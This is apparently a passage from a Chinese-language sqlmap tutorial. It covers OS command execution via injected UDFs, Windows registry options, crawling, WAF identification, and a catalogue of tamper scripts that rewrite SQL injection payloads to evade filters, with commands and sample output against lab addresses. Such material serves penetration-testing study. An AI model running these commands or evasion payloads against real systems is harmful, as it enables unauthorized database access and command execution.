<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \</div><div class="line"><span class="comment">--os-cmd id -v 1</span></div><div class="line"></div><div class="line">[...]</div><div class="line">web application technology: PHP 5.2.6, Apache 2.2.9</div><div class="line">back-<span class="keyword">end</span> DBMS: PostgreSQL</div><div class="line">[hh:mm:<span class="number">12</span>] [INFO] fingerprinting the back-<span class="keyword">end</span> DBMS operating <span class="keyword">system</span></div><div class="line">[hh:mm:<span class="number">12</span>] [INFO] the back-<span class="keyword">end</span> DBMS operating <span class="keyword">system</span> <span class="keyword">is</span> Linux</div><div class="line">[hh:mm:<span class="number">12</span>] [INFO] testing <span class="keyword">if</span> <span class="keyword">current</span> <span class="keyword">user</span> <span class="keyword">is</span> DBA</div><div class="line">[hh:mm:<span class="number">12</span>] [INFO] detecting back-<span class="keyword">end</span> DBMS <span class="keyword">version</span> <span class="keyword">from</span> its banner</div><div class="line">[hh:mm:<span class="number">12</span>] [INFO] checking <span class="keyword">if</span> UDF <span class="string">'sys_eval'</span> already exist</div><div class="line">[hh:mm:<span class="number">12</span>] [INFO] checking <span class="keyword">if</span> UDF <span class="string">'sys_exec'</span> already exist</div><div class="line">[hh:mm:<span class="number">12</span>] [INFO] creating UDF <span class="string">'sys_eval'</span> <span class="keyword">from</span> the <span class="built_in">binary</span> UDF <span class="keyword">file</span></div><div class="line">[hh:mm:<span class="number">12</span>] [INFO] creating UDF <span class="string">'sys_exec'</span> <span class="keyword">from</span> the <span class="built_in">binary</span> UDF <span class="keyword">file</span></div><div class="line"><span class="keyword">do</span> you want <span class="keyword">to</span> retrieve the command standard <span class="keyword">output</span>? [Y/n/a] y</div><div class="line">command standard <span class="keyword">output</span>:    <span class="string">'uid=104(postgres) gid=106(postgres) groups=106(postgres)'</span></div><div class="line"></div><div class="line">[hh:mm:<span class="number">19</span>] [INFO] cleaning up the <span class="keyword">database</span> <span class="keyword">management</span> <span class="keyword">system</span></div><div class="line"><span class="keyword">do</span> you want <span class="keyword">to</span> remove UDF <span class="string">'sys_eval'</span>? [Y/n] y</div><div class="line"><span class="keyword">do</span> you want <span class="keyword">to</span> remove UDF <span class="string">'sys_exec'</span>? [Y/n] y</div><div class="line">[hh:mm:<span class="number">23</span>] [INFO] <span class="keyword">database</span> <span class="keyword">management</span> <span class="keyword">system</span> <span class="keyword">cleanup</span> finished</div><div class="line">[hh:mm:<span class="number">23</span>] [<span class="keyword">WARNING</span>] remember that UDF <span class="keyword">shared</span> <span class="keyword">object</span> files saved <span class="keyword">on</span> the <span class="keyword">file</span> <span class="keyword">system</span> can</div><div class="line"><span class="keyword">only</span> be deleted manually</div></pre></td></tr></table></figure>
<h4 id="对Windows注册表操作"><a href="#对Windows注册表操作" class="headerlink" title="对Windows注册表操作"></a>对Windows注册表操作</h4><p>当数据库为<code>MySQL</code>，<code>PostgreSQL</code>或<code>Microsoft SQL Server</code>，并且当前web应用支持堆查询。 当然，当前连接数据库的用户也需要有权限操作注册表。</p>
<h5 id="读取注册表值"><a href="#读取注册表值" class="headerlink" title="读取注册表值"></a>读取注册表值</h5><p><code>--reg-read</code></p>
<h5 id="写入注册表值"><a href="#写入注册表值" class="headerlink" title="写入注册表值"></a>写入注册表值</h5><p><code>--reg-add</code></p>
<h5 id="删除注册表值"><a href="#删除注册表值" class="headerlink" title="删除注册表值"></a>删除注册表值</h5><p><code>--reg-del</code></p>
<h4 id="常规参数"><a href="#常规参数" class="headerlink" title="常规参数"></a>常规参数</h4><h5 id="从sqlite中读取session"><a href="#从sqlite中读取session" class="headerlink" title="从sqlite中读取session"></a>从sqlite中读取session</h5><p><code>-s</code></p>
<p>sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数。</p>
<h5 id="保存HTTP-S-日志"><a href="#保存HTTP-S-日志" class="headerlink" title="保存HTTP(S)日志"></a>保存HTTP(S)日志</h5><p><code>-t</code></p>
<p>这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。</p>
<h5 id="非交互模式"><a href="#非交互模式" class="headerlink" title="非交互模式"></a>非交互模式</h5><p><code>--batch</code></p>
<p>用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</p>
<h5 id="强制使用字符编码"><a href="#强制使用字符编码" class="headerlink" title="强制使用字符编码"></a>强制使用字符编码</h5><p><code>--charset</code></p>
<p>不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">--charset</span>=GBK</div></pre></td></tr></table></figure>
<h5 id="爬行网站URL"><a href="#爬行网站URL" class="headerlink" title="爬行网站URL"></a>爬行网站URL</h5><p><code>--crawl</code></p>
<p>sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ python sqlmap.py -u <span class="string">"http://192.168.21.128/sqlmap/mysql/"</span> --batch --crawl=<span class="number">3</span></div><div class="line">[...]</div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">53</span>] [INFO] starting crawler</div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">53</span>] [INFO] searching <span class="keyword">for</span> links with depth <span class="number">1</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">53</span>] [WARNING] running <span class="keyword">in</span> a single-thread mode. This could take a <span class="keyword">while</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">53</span>] [INFO] searching <span class="keyword">for</span> links with depth <span class="number">2</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">54</span>] [INFO] heuristics detected web page charset <span class="string">'ascii'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">00</span>] [INFO] <span class="number">42</span>/<span class="number">56</span> links visited (<span class="number">75</span>%)</div><div class="line">[...]</div></pre></td></tr></table></figure>
<h5 id="规定输出到CSV中的分隔符"><a href="#规定输出到CSV中的分隔符" class="headerlink" title="规定输出到CSV中的分隔符"></a>规定输出到CSV中的分隔符</h5><p><code>--csv-del</code></p>
<p>当dump保存为CSV格式时（<code>--dump-format=CSV</code>），需要一个分隔符默认是逗号，用户也可以改为别的 如：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attr">--csv-del</span>=<span class="string">";"</span></div></pre></td></tr></table></figure>
<h4 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h4><h5 id="使用HTTP参数污染"><a href="#使用HTTP参数污染" class="headerlink" title="使用HTTP参数污染"></a>使用HTTP参数污染</h5><p><code>-hpp</code></p>
<p>HTTP参数污染可能会绕过<code>WAF/IPS/IDS</code>保护机制，这个对<code>ASP/IIS</code>与<code>ASP.NET/IIS</code>平台很有效</p>
<h5 id="测试WAF-IPS-IDS保护"><a href="#测试WAF-IPS-IDS保护" class="headerlink" title="测试WAF/IPS/IDS保护"></a>测试WAF/IPS/IDS保护</h5><p><code>--identify-waf</code></p>
<p>sqlmap可以尝试找出<code>WAF/IPS/IDS</code>保护，方便用户做出绕过方式。目前大约支持30种产品的识别。</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">$ python sqlmap.py -u <span class="string">"http://192.168.21.128/sqlmap/mysql/get_int.php?id=1"</span> --identify-waf -v <span class="number">3</span></div><div class="line">[...]</div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [INFO] testing connection to the target URL</div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [INFO] heuristics detected web page charset <span class="string">'ascii'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [INFO] using WAF scripts to detect backend WAF<span class="regexp">/IPS/</span>IDS protection</div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'USP Secure Entry Server (United Security Providers)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'BinarySEC Web Application Firewall (BinarySEC)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'Hyperguard Web Application Firewall (art of defence Inc.)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'Cisco ACE XML Gateway (Cisco Systems)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'TrafficShield (F5 Networks)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'KONA Security Solutions (Akamai Technologies)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'Incapsula Web Application Firewall (Incapsula/Imperva)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'CloudFlare Web Application Firewall (CloudFlare)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'Barracuda Web Application Firewall (Barracuda Networks)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'webApp.secure (webScurity)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'Proventia Web Application Security (IBM)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] declared web page charset <span class="string">'iso-8859-1'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] page not found (<span class="number">404</span>)</div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'KS-WAF (Knownsec)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'NetScaler (Citrix Systems)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'Jiasule Web Application Firewall (Jiasule)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'WebKnight Application Firewall (AQTRONIX)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'AppWall (Radware)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF<span class="regexp">/IDS/</span>IPS product <span class="string">'ModSecurity: Open Source Web Application Firewall (Trustwave)'</span></div><div class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">23</span>] [CRITICAL] WAF<span class="regexp">/IDS/</span>IPS identified <span class="string">'ModSecurity: Open Source Web Application Firewall (Trustwave)'</span>. Please consider usage of tamper scripts (option <span class="string">'--tamper'</span>)</div><div class="line">[...]</div></pre></td></tr></table></figure>
<h3 id="自带tamper分析"><a href="#自带tamper分析" class="headerlink" title="自带tamper分析"></a>自带tamper分析</h3><h4 id="单引号替换-apostrophemask-py"><a href="#单引号替换-apostrophemask-py" class="headerlink" title="单引号替换 apostrophemask.py"></a>单引号替换 apostrophemask.py</h4><p>使用<code>utf-8 编码</code> 字符<code>＇</code>(<code>U+FF07</code>)替换单引号<code>&#39;</code>(<code>U+0027</code>)</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span><span class="string">' AND '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span>  </div><div class="line">==&gt;</div><div class="line"><span class="number">1</span>%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</div></pre></td></tr></table></figure>
<p>适用数据库：ALL</p>
<h4 id="单引号替换-apostrophenullencode-py"><a href="#单引号替换-apostrophenullencode-py" class="headerlink" title="单引号替换 apostrophenullencode.py"></a>单引号替换 apostrophenullencode.py</h4><p>将单引号替换为<code>%00%27</code> 在引号前插入了空字符<code>U+0000</code></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>' AND '<span class="number">1</span>'='<span class="number">1</span></div><div class="line">==&gt;</div><div class="line"><span class="number">1</span>�' AND �'<span class="number">1</span>�'=�'<span class="number">1</span></div></pre></td></tr></table></figure>
<p>适用数据库：ALL</p>
<h4 id="添加空字符-appendnullbyte-py"><a href="#添加空字符-appendnullbyte-py" class="headerlink" title="添加空字符 appendnullbyte.py"></a>添加空字符 appendnullbyte.py</h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">return</span> <span class="string">"%s%%00"</span> % payload <span class="keyword">if</span> payload <span class="keyword">else</span> payload</div></pre></td></tr></table></figure>
<p>适用数据库：<code>Access</code></p>
<h4 id="base64编码-base64encode-py"><a href="#base64编码-base64encode-py" class="headerlink" title="base64编码 base64encode.py"></a>base64编码 base64encode.py</h4><p>这个看模块名也知道是<code>base64</code>编码</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">return</span> base64.b64encode(payload.encode(UNICODE_ENCODING)) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</div></pre></td></tr></table></figure>
<p>适用数据库：ALL</p>
<h4 id="比较符替换-between-py"><a href="#比较符替换-between-py" class="headerlink" title="比较符替换 between.py"></a>比较符替换 between.py</h4><p>将大于符号和等号用<code>between</code>语句替换，用于过滤了大于符号和等号的情况</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span> <span class="keyword">AND </span>A &gt; <span class="keyword">B</span></div><div class="line">==&gt;</div><div class="line"><span class="number">1</span> <span class="keyword">AND </span>A NOT <span class="keyword">BETWEEN </span><span class="number">0</span> <span class="keyword">AND </span><span class="keyword">B</span></div></pre></td></tr></table></figure>
<p>适用数据库：ALL</p>
<h4 id="空格替换-bluecoat-py"><a href="#空格替换-bluecoat-py" class="headerlink" title="空格替换 bluecoat.py"></a>空格替换 bluecoat.py</h4><p>用<code>%09 U+0009</code>水平制表符代替空格，并且将等号替换为 <code>like</code> ，用于过滤了空格和等号的情况</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="number">1</span></div><div class="line">==&gt;</div><div class="line"><span class="keyword">SELECT</span>%<span class="number">09</span><span class="keyword">id</span> <span class="keyword">FROM</span>%<span class="number">09</span><span class="keyword">users</span> <span class="keyword">WHERE</span>%<span class="number">09</span><span class="keyword">id</span> <span class="keyword">LIKE</span> <span class="number">1</span></div></pre></td></tr></table></figure>
<p>适用数据库：<code>MySQL 5.1</code>, <code>SGOS</code></p>
<h4 id="两次urlencode-chardoubleencode-py"><a href="#两次urlencode-chardoubleencode-py" class="headerlink" title="两次urlencode chardoubleencode.py"></a>两次urlencode chardoubleencode.py</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">SELECT FIELD FROM<span class="meta">%</span><span class="number">20</span>TABLE</div><div class="line">==&gt;</div><div class="line"><span class="meta">%</span><span class="number">2553</span><span class="meta">%</span><span class="number">2545</span><span class="meta">%</span><span class="number">254</span>C<span class="meta">%</span><span class="number">2545</span><span class="meta">%</span><span class="number">2543</span><span class="meta">%</span><span class="number">2554</span><span class="meta">%</span><span class="number">2520</span><span class="meta">%</span><span class="number">2546</span><span class="meta">%</span><span class="number">2549</span><span class="meta">%</span><span class="number">2545</span><span class="meta">%</span><span class="number">254</span>C<span class="meta">%</span><span class="number">2544</span><span class="meta">%</span><span class="number">2520</span><span class="meta">%</span><span class="number">2546</span><span class="meta">%</span><span class="number">2552</span><span class="meta">%</span><span class="number">254</span>F<span class="meta">%</span><span class="number">254</span>D<span class="meta">%</span><span class="number">2520</span><span class="meta">%</span><span class="number">2554</span><span class="meta">%</span><span class="number">2541</span><span class="meta">%</span><span class="number">2542</span><span class="meta">%</span><span class="number">254</span>C<span class="meta">%</span><span class="number">2545</span></div></pre></td></tr></table></figure>
<p>适用数据库：ALL</p>
<h4 id="一次url编码-charencode-py"><a href="#一次url编码-charencode-py" class="headerlink" title="一次url编码 charencode.py"></a>一次url编码 charencode.py</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">SELECT FIELD FROM<span class="meta">%</span><span class="number">20</span>TABLE</div><div class="line">==&gt;</div><div class="line"><span class="meta">%</span><span class="number">53</span><span class="meta">%</span><span class="number">45</span><span class="meta">%</span><span class="number">4</span>C<span class="meta">%</span><span class="number">45</span><span class="meta">%</span><span class="number">43</span><span class="meta">%</span><span class="number">54</span><span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">46</span><span class="meta">%</span><span class="number">49</span><span class="meta">%</span><span class="number">45</span><span class="meta">%</span><span class="number">4</span>C<span class="meta">%</span><span class="number">44</span><span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">46</span><span class="meta">%</span><span class="number">52</span><span class="meta">%</span><span class="number">4</span>F<span class="meta">%</span><span class="number">4</span>D<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">54</span><span class="meta">%</span><span class="number">41</span><span class="meta">%</span><span class="number">42</span><span class="meta">%</span><span class="number">4</span>C<span class="meta">%</span><span class="number">45</span></div></pre></td></tr></table></figure>
<h4 id="unicode转义-charunicodeencode-py"><a href="#unicode转义-charunicodeencode-py" class="headerlink" title="unicode转义 charunicodeencode.py"></a>unicode转义 charunicodeencode.py</h4><p>使用<code>unicode</code>转义所有字符，除了已经<code>urlencode</code>的字符</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">SELECT FIELD<span class="meta">%</span><span class="number">20</span>FROM TABLE</div><div class="line">==&gt;</div><div class="line"><span class="meta">%</span>u<span class="number">0053</span><span class="meta">%</span>u<span class="number">0045</span><span class="meta">%</span>u<span class="number">004</span>C<span class="meta">%</span>u<span class="number">0045</span><span class="meta">%</span>u<span class="number">0043</span><span class="meta">%</span>u<span class="number">0054</span><span class="meta">%</span>u<span class="number">0020</span><span class="meta">%</span>u<span class="number">0046</span><span class="meta">%</span>u<span class="number">0049</span><span class="meta">%</span>u<span class="number">0045</span><span class="meta">%</span>u<span class="number">004</span>C<span class="meta">%</span>u<span class="number">0044</span><span class="meta">%</span>u<span class="number">0020</span><span class="meta">%</span>u<span class="number">0046</span><span class="meta">%</span>u<span class="number">0052</span><span class="meta">%</span>u<span class="number">004</span>F<span class="meta">%</span>u<span class="number">004</span>D<span class="meta">%</span>u<span class="number">0020</span><span class="meta">%</span>u<span class="number">0054</span><span class="meta">%</span>u<span class="number">0041</span><span class="meta">%</span>u<span class="number">0042</span><span class="meta">%</span>u<span class="number">004</span>C<span class="meta">%</span>u<span class="number">0045</span></div></pre></td></tr></table></figure>
<p>适用数据库：ALL，但是需要 <code>asp</code> 和 <code>asp.net</code> 环境</p>
<h4 id="unicode转义-charunicodeescape-py"><a href="#unicode转义-charunicodeescape-py" class="headerlink" title="unicode转义 charunicodeescape.py"></a>unicode转义 charunicodeescape.py</h4><p>常用语绕过<code>WAF</code>中<code>JSON</code>数据</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">SELECT FIELD FROM TABLE</div><div class="line">==&gt;</div><div class="line"><span class="symbol">\\</span><span class="symbol">\\</span>u0053<span class="symbol">\\</span><span class="symbol">\\</span>u0045<span class="symbol">\\</span><span class="symbol">\\</span>u004C<span class="symbol">\\</span><span class="symbol">\\</span>u0045<span class="symbol">\\</span><span class="symbol">\\</span>u0043<span class="symbol">\\</span><span class="symbol">\\</span>u0054<span class="symbol">\\</span><span class="symbol">\\</span>u0020<span class="symbol">\\</span><span class="symbol">\\</span>u0046<span class="symbol">\\</span><span class="symbol">\\</span>u0049<span class="symbol">\\</span><span class="symbol">\\</span>u0045<span class="symbol">\\</span><span class="symbol">\\</span>u004C<span class="symbol">\\</span><span class="symbol">\\</span>u0044<span class="symbol">\\</span><span class="symbol">\\</span>u0020<span class="symbol">\\</span><span class="symbol">\\</span>u0046<span class="symbol">\\</span><span class="symbol">\\</span>u0052<span class="symbol">\\</span><span class="symbol">\\</span>u004F<span class="symbol">\\</span><span class="symbol">\\</span>u004D<span class="symbol">\\</span><span class="symbol">\\</span>u0020<span class="symbol">\\</span><span class="symbol">\\</span>u0054<span class="symbol">\\</span><span class="symbol">\\</span>u0041<span class="symbol">\\</span><span class="symbol">\\</span>u0042<span class="symbol">\\</span><span class="symbol">\\</span>u004C<span class="symbol">\\</span><span class="symbol">\\</span>u0045</div></pre></td></tr></table></figure>
<h4 id="逗号替换-commalesslimit-py"><a href="#逗号替换-commalesslimit-py" class="headerlink" title="逗号替换 commalesslimit.py"></a>逗号替换 commalesslimit.py</h4><p>将的逗号用<code>offset</code>代替，用于过滤了逗号并且是两个参数的情况</p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">LIMIT 2, 3</div><div class="line">=<span class="ruby">=&gt;</span></div><div class="line">LIMIT 3 OFFSET 2</div></pre></td></tr></table></figure>
<p>适用数据库：<code>MySQL</code></p>
<h4 id="mid函数逗号替换-commalessmid-py"><a href="#mid函数逗号替换-commalessmid-py" class="headerlink" title="mid函数逗号替换 commalessmid.py"></a>mid函数逗号替换 commalessmid.py</h4><p>将<code>mid</code>函数中的<code>start,end</code>换成<code>from to</code></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">MID</span><span class="params">(VERSION()</span></span>, <span class="number">1</span>, <span class="number">1</span>)</div><div class="line">==&gt;</div><div class="line"><span class="function"><span class="title">MID</span><span class="params">(VERSION()</span></span> FROM <span class="number">1</span> FOR <span class="number">1</span></div></pre></td></tr></table></figure>
<p>适用数据库：<code>MySQL</code></p>
<h4 id="括号前注释-commentbeforeparentheses-py"><a href="#括号前注释-commentbeforeparentheses-py" class="headerlink" title="括号前注释 commentbeforeparentheses.py"></a>括号前注释 commentbeforeparentheses.py</h4><p>在单词后括号前加行内注释以绕过WAF</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">SELECT</span> <span class="built_in">ABS</span>(<span class="number">1</span>)</div><div class="line">==&gt;</div><div class="line"><span class="built_in">SELECT</span> <span class="built_in">ABS</span><span class="comment">/**/</span>(<span class="number">1</span>)</div></pre></td></tr></table></figure>
<p>适用数据库：ALL</p>
<h4 id="concat替换-concat2concatws-py"><a href="#concat替换-concat2concatws-py" class="headerlink" title="concat替换 concat2concatws.py"></a>concat替换 concat2concatws.py</h4><p>用于过滤了<code>concat</code>函数的情况，将其转换为<code>concat_ws</code>函数</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CONCAT(<span class="number">1</span>,<span class="number">2</span>)</div><div class="line">==&gt;</div><div class="line">CONCAT_WS(MID(CHAR(<span class="number">0</span>),<span class="number">0</span>,<span class="number">0</span>),<span class="number">1</span>,<span class="number">2</span></div></pre></td></tr></table></figure>
<p>适用数据库：<code>MySQL</code></p>
<h4 id="等号替换成like-equaltolike-py"><a href="#等号替换成like-equaltolike-py" class="headerlink" title="等号替换成like equaltolike.py"></a>等号替换成like equaltolike.py</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">1</span></div><div class="line">==&gt;</div><div class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> <span class="keyword">LIKE</span> <span class="number">1</span></div></pre></td></tr></table></figure>
<h4 id="引号转义逃逸-escapequotes-py"><a href="#引号转义逃逸-escapequotes-py" class="headerlink" title="引号转义逃逸 escapequotes.py"></a>引号转义逃逸 escapequotes.py</h4><p><code>&#39;</code>单引号变成<code>\\&#39;</code>,<code>&quot;</code>双引号变成<code>\\&quot;</code></p>
<h4 id="大于号替换-greatest-py"><a href="#大于号替换-greatest-py" class="headerlink" title="大于号替换 greatest.py"></a>大于号替换 greatest.py</h4><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 AND A &gt; B</div><div class="line">=<span class="ruby">=&gt;</span></div><div class="line">1 AND GREATEST(A,B+1)=A</div></pre></td></tr></table></figure>
